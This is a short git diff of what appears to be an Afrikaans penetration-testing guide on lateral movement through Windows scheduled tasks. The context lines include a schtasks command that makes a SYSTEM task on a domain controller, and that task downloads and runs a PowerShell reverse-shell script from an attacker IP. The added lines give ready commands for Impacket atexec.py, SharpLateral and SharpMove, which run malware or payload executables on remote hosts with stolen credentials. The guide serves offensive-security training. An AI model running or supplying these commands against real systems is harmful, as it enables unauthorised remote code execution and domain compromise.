@@ -18,9 +18,17 @@ schtasks /run /tn <TASK_NAME> /S <VICTIM>
 schtasks /create /S dcorp-dc.domain.local /SC Weekely /RU "NT Authority\SYSTEM" /TN "MyNewtask" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.X/InvokePowerShellTcp.ps1''')'"
 schtasks /run /tn "MyNewtask" /S dcorp-dc.domain.local
 ```
+Jy kan **Impacket se `atexec.py`** gebruik om op afstand op afstandstelsels opdragte uit te voer met die AT-opdrag. Dit vereis geldige geloofsbriewe (gebruikersnaam en wagwoord of hash) vir die teikenstelsel.
+```bash
+atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
+```
 U kan ook [SharpLateral](https://github.com/mertdas/SharpLateral) gebruik.
 ```bash
 SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
+```
+U kan [SharpMove](https://github.com/0xthirteen/SharpMove) gebruik:
+```bash
+SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
 ```
 Meer inligting oor die [**gebruik van schtasks met silver tickets hier**](../active-directory-methodology/silver-ticket.md#host).
 
